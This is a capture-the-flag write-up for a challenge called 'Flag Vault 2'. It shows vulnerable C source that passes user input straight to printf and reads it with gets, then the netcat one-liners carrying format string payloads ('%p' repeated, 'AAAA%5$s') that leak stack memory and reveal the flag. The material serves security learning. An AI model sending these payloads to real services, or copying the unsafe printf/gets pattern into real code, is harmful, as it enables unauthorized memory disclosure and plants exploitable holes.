## Flag Vault 2

> Format String Exploitation

![image](https://github.com/user-attachments/assets/63609813-9ce4-48a8-89bf-4c76ca814636)



### Source Code

```
#include <stdio.h>
#include <string.h>

void print_banner(){
 printf( "  ______ _          __      __         _ _   \n"
   " |  ____| |         \\ \\    / /        | | |  \n"
  " | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
  " |  __| | |/ _ |/ _ \\ \\/ / _ | | | | | __|\n"
  " | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
  " |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
  "                  __/ |                      \n"
  "                 |___/                       \n"
  "                                             \n"
  "Version 2.1 - Fixed print_flag to not print the flag. Nothing you can do about it!\n"
  "==================================================================\n\n"
       );
}

void print_flag(char *username){
        FILE *f = fopen("flag.txt","r");
        char flag[200];

        fgets(flag, 199, f);
        //printf("%s", flag);
 
 //The user needs to be mocked for thinking they could retrieve the flag
 printf("Hello, ");
 printf(username);
 printf(". Was version 2.0 too simple for you? Well I don't see no flags being shown now xD xD xD...\n\n");
 printf("Yours truly,\nByteReaper\n\n");
}

void login(){
 char username[100] = "";

 printf("Username: ");
 gets(username);

 // The flag isn't printed anymore. No need for authentication
 print_flag(username);
}

void main(){
 setvbuf(stdin, NULL, _IONBF, 0);
 setvbuf(stdout, NULL, _IONBF, 0);
 setvbuf(stderr, NULL, _IONBF, 0);

 // Start login process
 print_banner();
 login();

 return;
}
```

---

### Initial Memory Leak Attempt

First, I tried overflow it by putting tons of characters in it 

I then tried leaking memory to look for a return of hex values.

```python3 -c 'print("%x "*50)' | nc 10.10.100.29 1337```

This returned a bunch of random hex values so I know it worked, but no flag appeared yet.

![notflag](https://github.com/user-attachments/assets/37f3bc44-42ba-41da-8508-3461144838b0)


---

### Switching it up
%x prints values in hex, %p leaks pointer values — which will get me flag fragments in memory.

I used the command:

```python3 -c 'print("%p "*50)' | nc 10.10.100.29 1337```


This leaked a few stack values from the memory:

```
0x6d726f667b4d4854  →  "THM{form"
0x65757373695f7461  →  "at_issue"
```

*(The flag was here right under my nose tbh buttt I was getting hot hot hot and wanted to keep going until it was correct...)*

---

### Extracting the Full Flag

Once I realized what was going on, I refined my attack to read the 5th argument on the stack as a string (%5$s) combined with AAAA:

*the "AAAA" prefix helps locate where the input lands in memory — good trick for offset guessing.*

```python3 -c 'print("AAAA%5$s")' | nc 10.10.100.29 1337```

![image](https://github.com/user-attachments/assets/569d8f39-aefc-43d6-8b95-ea9b294d33c1)

This gave me:

THM{format_issues}
